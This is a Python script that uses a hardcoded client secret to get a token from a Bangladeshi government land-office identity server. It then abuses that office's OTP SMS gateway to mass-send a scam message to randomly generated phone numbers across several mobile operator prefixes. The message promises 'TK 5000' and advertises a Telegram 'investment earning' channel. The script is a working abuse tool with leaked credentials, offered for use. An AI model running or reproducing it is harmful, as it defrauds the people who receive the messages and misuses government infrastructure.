import requests
import random
import threading

API = "https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"

headers = {
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "content-type": "application/x-www-form-urlencoded; charset=utf-8",
    "accept-encoding": "gzip",
    "content-length": "29",
    "authorization": "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
    "host": "idp.land.gov.bd"
}

data = {
    "grant_type": "client_credentials"
}

resp = requests.post(API, headers=headers, data=data).json()
token = resp['access_token']

def send_sms(number, message):
    mAPI = "https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
    headers = {
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "accept": "application/json",
        "accept-encoding": "gzip",
        "content-length": "112",
        "host": "sms-api.land.gov.bd",
        "authorization": f"Bearer {token}",
        "content-type": "application/json; charset=utf-8"
    }
    data = {
        "msgTmp": f"{message} $code",
        "destination": f"{number}",
        "otpType": "sms",
        "otpLength": 0
    }
    resp = requests.post(mAPI, headers=headers, json=data)
    print(resp.text)

def generate_numbers(operator, count):
    numbers = []
    for _ in range(count):
        prefix = operator
        for _ in range(8):  # Generate random 8-digit number
            prefix += str(random.randint(0, 9))
        numbers.append(prefix)
    return numbers

def main():
    message = "You Got TK 5000,GRAB IT FROM: https://t.me/INVESTEARININGBANGLA|ডেইলি ২0 থেকে ৫0 হাজার টাকা ইনকাম করতে পারবেন ! এটি নিন:https://t.me/INVESTEARININGBANGLA "
    
    
    # User input for amount and number of phone numbers
    amount = int(input("Enter the amount for each operator: "))
    num_count = int(input("Enter the number of phone numbers to generate for each operator: "))
    
    # Generate numbers for different operators
    operator_017 = generate_numbers("017", num_count)
    operator_018 = generate_numbers("018", num_count)
    operator_019 = generate_numbers("019", num_count)
    operator_013 = generate_numbers("013", num_count)
    operator_015 = generate_numbers("015", num_count)
    
    # Send messages using threads
    threads = []
    for num in operator_017 + operator_018 + operator_019 + operator_013 + operator_015:
        t = threading.Thread(target=send_sms, args=(num, message))
        threads.append(t)
        t.start()
    
    # Wait for all threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
